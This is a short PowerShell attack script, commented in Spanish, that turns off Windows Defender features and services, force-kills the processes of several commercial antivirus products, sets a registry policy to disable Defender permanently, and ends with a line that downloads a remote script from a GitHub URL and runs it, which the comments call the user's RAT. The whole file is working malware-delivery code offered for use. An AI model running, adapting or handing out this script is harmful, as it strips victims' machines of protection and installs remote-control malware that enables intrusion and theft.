# MATA TODOS LOS ANTIVIRUS Y EJECUTA TU RAT
Set-MpPreference -DisableRealtimeMonitoring $true -Force
Set-MpPreference -DisableIntrusionPreventionSystem $true -Force
Set-MpPreference -DisableIOAVProtection $true -Force
Set-MpPreference -DisableScriptScanning $true -Force
Set-MpPreference -SubmitSamplesConsent 2 -Force
net stop WinDefend 2>$null
net stop SecurityHealthService 2>$null

# Mata procesos comunes de AV
Get-Process | Where-Object {$_.Path -like "*Kaspersky*" -or $_.Path -like "*Bitdefender*" -or $_.Path -like "*Avast*" -or $_.Path -like "*Norton*" -or $_.Path -like "*McAfee*" -or $_.Path -like "*Malwarebytes*"} | Stop-Process -Force

# Desactiva Windows Defender por registro (permanente)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# Ejecuta tu RAT principal (el que ya tenías)
iex ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Fondoucan660/rat-for-picopi/main/real.ps1'))
